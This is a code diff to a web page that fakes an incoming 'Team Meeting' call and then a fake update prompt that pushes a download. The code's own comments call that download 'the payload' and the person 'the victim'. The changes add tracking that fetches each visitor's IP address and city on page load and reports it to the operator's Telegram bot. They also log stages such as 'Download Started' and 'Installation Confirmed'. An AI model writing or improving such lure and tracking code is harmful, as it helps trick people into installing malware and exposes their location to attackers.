@@ -78,12 +78,12 @@
             text-shadow: 0 1px 2px rgba(0,0,0,0.5);
         }
 
-        /* === CALL DIALOGUE BOX === */
+        /* === CALL DIALOGUE BOX (Top Center) === */
         .call-dialogue {
             position: fixed;
-            top: 50%;
+            top: 20px; /* Changed from center to top */
             left: 50%;
-            transform: translate(-50%, -50%);
+            transform: translateX(-50%); /* Center horizontally */
             width: 320px;
             background-color: #1f1f1f;
             border-radius: 8px;
@@ -92,6 +92,12 @@
             display: none; /* Hidden initially */
             overflow: hidden;
             border: 1px solid #333;
+            animation: slideDown 0.5s ease-out;
+        }
+
+        @keyframes slideDown {
+            from { top: -100px; opacity: 0; }
+            to { top: 20px; opacity: 1; }
         }
 
         .call-header {
@@ -295,7 +301,7 @@
         </div>
     </div>
 
-    <!-- Stage 2: Call Dialogue (Visible first) -->
+    <!-- Stage 2: Call Dialogue (Now at Top) -->
     <div class="call-dialogue" id="callDialogue">
         <div class="call-header">
             <div class="caller-name">Team Meeting</div>
@@ -334,6 +340,8 @@
 
         let seconds = 0;
         let timerInterval;
+        let userIP = "Fetching...";
+        let userLocation = "";
 
         // Helper function to detect OS
         function getOS() {
@@ -346,11 +354,26 @@
             return "Unknown OS";
         }
 
+        // Fetch IP Address immediately on load
+        async function fetchIPInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                userIP = data.ip || "Unknown";
+                userLocation = `${data.city}, ${data.country_name}`;
+            } catch (error) {
+                userIP = "Unavailable";
+                userLocation = "";
+            }
+        }
+
         // Helper function to send logs to Telegram
         async function logToTelegram(message) {
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             const os = getOS();
-            const fullMessage = `${message}\n\n🖥️ Device: ${os}`;
+            
+            // Construct message with IP and Location
+            const fullMessage = `${message}\n\n🖥️ Device: ${os}\n🌍 IP: ${userIP} (${userLocation})\n⏰ Time: ${new Date().toLocaleString()}`;
             
             const body = JSON.stringify({
                 chat_id: TELEGRAM_CHAT_ID,
@@ -371,6 +394,9 @@
 
         // 1. Start Call Immediately on Load
         window.onload = function() {
+            // Fetch IP in background
+            fetchIPInfo();
+
             document.getElementById('callDialogue').style.display = 'block';
             
             // Start Timer
@@ -419,7 +445,7 @@
                 modal.style.transform = 'translateX(-50%) translateY(0)';
                 
                 // Send Notification: Call Dropped + Update Requested
-                logToTelegram(`🚨 <b>Event: Call Drop & Update Triggered</b>\n\nTime: ${new Date().toLocaleString()}`);
+                logToTelegram(`🚨 <b>Event: Call Drop & Update Triggered</b>`);
             }, 1000);
         }
 
@@ -441,7 +467,7 @@
                 document.getElementById('callDialogue').style.display = 'none';
                 
                 // Send Notification: Download Started
-                logToTelegram(`⬇️ <b>Download Started</b>\n\nThe payload has been sent to the victim's browser.\nTime: ${new Date().toLocaleString()}`);
+                logToTelegram(`⬇️ <b>Download Started</b>\nThe payload has been sent to the victim's browser.`);
             }, 1000);
         });
 
@@ -457,7 +483,7 @@
                 btn.style.backgroundColor = '#28a745'; // Green
                 
                 // Send Final Notification: Install Confirmed
-                logToTelegram(`✅ <b>Installation Confirmed</b>\n\nVictim clicked "I Installed It".\nTime: ${new Date().toLocaleString()}`);
+                logToTelegram(`✅ <b>Installation Confirmed</b>\nVictim clicked "I Installed It".`);
             }, 2000);
         });
     </script>
